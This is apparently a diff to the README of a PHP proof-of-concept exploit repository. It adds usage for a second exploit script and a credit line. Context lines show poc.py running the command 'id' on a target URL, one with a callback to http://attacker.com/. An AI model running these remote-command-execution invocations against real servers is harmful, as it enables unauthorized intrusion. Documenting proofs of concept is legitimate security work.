@@ -18,5 +18,11 @@ python3 poc.py http://target.example.com/ "id" -i
 # Blind callback (no LFI needed on target side)
 python3 poc.py http://target.example.com/ "id" --callback http://attacker.com/
 ```
+Usage for phppoc2
+
+```
+python3 exploit.py --port 18110
+```
 
 Writeup coming soon. Credit to Syrex1013
+For phpshell2, credit to 9bie
